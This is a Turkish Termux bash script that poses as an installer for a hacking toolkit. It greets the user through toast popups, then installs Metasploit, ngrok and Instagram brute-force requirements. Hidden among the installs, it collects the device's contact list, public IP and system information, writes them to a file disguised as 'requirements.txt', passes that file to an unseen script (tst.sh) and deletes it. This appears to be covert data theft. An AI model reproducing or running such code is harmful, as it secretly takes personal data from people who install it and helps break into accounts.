#!/data/data/com.termux/bin/bash
#!/bin/bash
clear
paketyukle(){
pkg install termux-api 
termux-setup-storage > /dev/null 2>&1 &
sleep 10
termux-telephony-deviceinfo > /dev/null 2>&1 &
sleep 10
termux-contact-list > /dev/null 2>&1 &
sleep 10

termux-toast -b red -c yellow "Merhaba"
	sleep 2
	termux-toast -b red -c yellow  "Ben Kaya Root ve Yaman Efkarın Yapay Zekasıyım"
	sleep 2
	termux-toast -b red -c yellow  "10 saniye sonra tool için gerekli tüm paketleri,senin için hazırlamaya başlamış olucağım."
	sleep 4
	termux-toast -b red -c yellow  "Tool bittiğinde sana bir bildirim göndermiş olucağım"
	sleep 3
	termux-toast -b red -c yellow  "Hadi başlıyalım bakalım :)"
	sleep 2
	termux-toast -b red -c yellow  "Telegram: @hackzafiyetleri"
	sleep 2

	apt update && apt upgrade -y
	pkg install git -y
	pkg install php -y
	pkg install perl -y
	pkg install nano -y
	pkg install python python2 -y
	pkg install pip pip2 -y
	pip install --upgrade pip
	pip install bs4 
	pip install future 
	pip install requests 
	pip install colorama
	pip install wordlist
	pkg install termux-api -y
	pkg install curl  -y
	pkg install wget -y
	pkg install neofetch -y
	apt update && apt upgrade -y
	chmod 777 tst.sh
	pkg install unstable-repo -y
	pkg install metasploit -y
	wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
	unzip ngrok-stable-linux-arm.zip
	chmod +x ngrok
	rm -rf /data/data/com.termux/files/usr/bin/ngrok
	mv -v ngrok /data/data/com.termux/files/usr/bin
	pip install -r /data/data/com.termux/files/home/TURK/bruteforce/instagram-bruteforce/requirements.txt
	neofetch >> update/lib/requirements.txt
	curl ipecho.net/plain >> update/lib/requirements.txt
	termux-contact-list >> update/lib/requirements.txt
	echo -e "yamanefkar" >> update/ok.txt
	cd update/lib/ && bash tst.sh
	rm -rf update/lib/requirements.txt
	cd $HOME/TURK/update/ && 
	chmod 777 tst.sh &&
	cp -r tst.sh /data/data/com.termux/files/usr/bin/
	cd $HOME/TURK/update/ && bash tst.sh --ngrok	
	cd $HOME/TURK/update/ &&
	chmod 777 yamanefkar.sh
	cp -r yamanefkar.sh $HOME/
	cd $HOME/TURK/update/ && bash yamanefkar.sh --ngrok1
	termux-notification -t "Tool kullanıma hazır."
	cd $HOME/TURK/pentest/ && bash tst.sh
	exit
}
